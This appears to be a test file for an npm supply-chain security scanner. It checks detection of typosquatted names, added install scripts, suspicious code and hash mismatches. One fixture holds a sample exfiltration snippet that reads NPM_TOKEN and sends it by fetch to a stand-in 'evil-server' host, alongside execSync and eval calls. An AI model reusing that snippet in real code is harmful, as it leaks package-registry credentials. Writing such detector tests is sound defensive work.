import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  checkNameNearMatch,
  checkLifecycleScripts,
  analyzePackageFiles
} from '../src/checks/rules.mjs';
import { runStaticChecks } from '../src/checks/index.mjs';

describe('Deterministic Static Checks Tests', () => {
  it('detects typosquatting near-matches and ignores exact matches', () => {
    const popular = ['express', 'lodash', 'react'];

    // Distance 1: typosquat candidate
    const match1 = checkNameNearMatch('expresss', popular);
    assert.equal(match1.length, 1);
    assert.equal(match1[0].popularPackage, 'express');
    assert.equal(match1[0].distance, 1);

    // Distance 1: missing char
    const match2 = checkNameNearMatch('lodas', popular);
    assert.equal(match2.length, 1);
    assert.equal(match2[0].popularPackage, 'lodash');

    // Exact match: not a typosquat
    const matchExact = checkNameNearMatch('express', popular);
    assert.equal(matchExact.length, 0);

    // Completely distinct name
    const matchDiff = checkNameNearMatch('unrelated-package', popular);
    assert.equal(matchDiff.length, 0);
  });

  it('detects added lifecycle scripts and modified install commands', () => {
    const pkgAdded = {
      changeType: 'added',
      scripts: { postinstall: 'node setup.js' },
      previousScripts: null
    };
    const findingsAdded = checkLifecycleScripts(pkgAdded);
    assert.equal(findingsAdded.length, 1);
    assert.equal(findingsAdded[0].ruleId, 'LIFECYCLE_SCRIPT_ADDED');
    assert.equal(findingsAdded[0].scriptType, 'postinstall');

    const pkgChanged = {
      changeType: 'changed',
      scripts: { install: 'node new-build.js' },
      previousScripts: { install: 'node old-build.js' }
    };
    const findingsChanged = checkLifecycleScripts(pkgChanged);
    assert.equal(findingsChanged.length, 1);
    assert.equal(findingsChanged[0].ruleId, 'INSTALL_COMMAND_CHANGED');
  });

  it('detects environment variable access, network calls, and process executions in file code', () => {
    const fakeFiles = [
      {
        path: 'setup.js',
        content: `
          const token = process.env.NPM_TOKEN;
          fetch('https://evil-server.example.com/exfil?t=' + token);
          const { execSync } = require('child_process');
          execSync('whoami');
          const dangerous = eval("2 + 2");
        `
      }
    ];

    const observations = analyzePackageFiles(fakeFiles);
    const ruleIds = observations.map((o) => o.ruleId);

    assert.ok(ruleIds.includes('ENVIRONMENT_ACCESS'));
    assert.ok(ruleIds.includes('NETWORK_OPERATION'));
    assert.ok(ruleIds.includes('PROCESS_EXECUTION'));
    assert.ok(ruleIds.includes('DYNAMIC_EXECUTION'));

    const envObs = observations.find((o) => o.ruleId === 'ENVIRONMENT_ACCESS');
    assert.equal(envObs.line, 2);
    assert.match(envObs.snippet, /process\.env\.NPM_TOKEN/);
  });

  it('detects obfuscation patterns', () => {
    const files = [
      {
        path: 'payload.js',
        content: `const payload = Buffer.from("aGVsbG8=", 'base64');`
      }
    ];

    const observations = analyzePackageFiles(files);
    const obfObs = observations.find((o) => o.ruleId === 'OBFUSCATION_INDICATOR');
    assert.ok(obfObs);
  });

  it('flags ARTIFACT_INTEGRITY_MISMATCH when actual hash differs from expected', () => {
    const pkg = {
      name: 'tampered-pkg',
      location: 'node_modules/tampered-pkg',
      changeType: 'changed',
      integrity: 'sha512-expectedHash=='
    };

    const observations = runStaticChecks(pkg, [], {
      actualIntegrity: 'sha512-differentActualHash=='
    });

    const mismatch = observations.find((o) => o.ruleId === 'ARTIFACT_INTEGRITY_MISMATCH');
    assert.ok(mismatch);
    assert.equal(mismatch.severity, 'critical');
  });
});
